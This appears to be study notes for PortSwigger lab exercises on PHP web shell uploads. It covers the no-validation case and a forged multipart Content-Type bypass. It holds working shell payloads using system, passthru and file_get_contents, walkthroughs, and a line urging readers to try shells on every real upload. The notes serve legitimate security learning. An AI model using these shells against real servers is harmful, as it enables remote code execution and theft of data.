# File upload - Basics (web shell RCE) + Content-Type bypass

Upload a PHP web shell where no real validation exists (or only the `Content-Type` header is checked), then request it -> RCE. Max impact: full server compromise.

## Quick reference
```
# web shell (PHP)
<?php echo file_get_contents('/home/carlos/secret'); ?>
<?php system($_GET['cmd']); ?>
# upload as exploit.php, then:  GET /files/avatars/exploit.php
# Content-Type bypass: keep filename=exploit.php but set
Content-Type: image/png
```

## Root cause
The server stores the uploaded file with its original name/extension in a web-executable dir and either does no validation or only trusts the client-supplied `Content-Type` (trivially forged in Burp).

## Technique
1. Find the upload (avatar) and where it's served (`GET /files/avatars/<name>`).
2. Create `exploit.php` with a shell; upload it via the `POST /my-account/avatar` multipart request.
3. **No validation:** it uploads; request `/files/avatars/exploit.php` -> the PHP executes, output in the response.
4. **Content-Type check:** the server rejects non-`image/*`. In the multipart part, keep `filename="exploit.php"` but change the part's `Content-Type:` from `application/x-php` to `image/png`. Re-upload -> accepted -> request it.

**Advanced / edge:** if output isn't reflected, use a command param (`?cmd=id`) or reverse shell; place the shell payload in `system()`/`shell_exec()`/`passthru()`.

## Payload arsenal
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
<?php system($_GET['cmd']); ?>      ->  /exploit.php?cmd=cat+/home/carlos/secret
<?php passthru($_GET['c']); ?>
# multipart tweak
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/png            <-- spoofed
```

## Bypasses
| Defense | Bypass |
|---|---|
| none | upload `.php` directly |
| Content-Type allowlist | set part `Content-Type: image/png`, keep `.php` filename |
| extension/content checks | `../Bypasses/` |

## Exploitation walkthrough (Content-Type bypass)
1. Upload `exploit.php` -> "only image/jpeg or image/png allowed".
2. In Repeater, resend the multipart upload but change the file part's `Content-Type` to `image/png` (filename stays `exploit.php`).
3. Accepted; `GET /files/avatars/exploit.php` -> secret printed -> solved.

## Chaining
- -> RCE / reverse shell; pivot internally.

## Tools
- **Burp Repeater** (multipart edit).

## Labs

### RCE via web shell upload [Apprentice]
URL: .../lab-file-upload-remote-code-execution-via-web-shell-upload - upload `exploit.php` (no validation), `GET /files/avatars/exploit.php` -> secret. Insight: executable upload in a web-exec dir = RCE.

### Web shell upload via Content-Type restriction bypass [Apprentice]
URL: .../lab-file-upload-web-shell-upload-via-content-type-restriction-bypass - spoof the part `Content-Type: image/png` with a `.php` filename. Insight: MIME is client-controlled.

Real-target transfer: every upload - try a `.php`/`.phtml` shell; if MIME-gated, spoof `Content-Type`.

## Real-world notes
- Avatar/attachment uploads are a top real-world RCE source; serving uploads from web root with original names is the killer.
- Many WAFs/scanners miss web shells hidden in image metadata (see `../Bypasses/` polyglot).

## References
- https://portswigger.net/web-security/file-upload
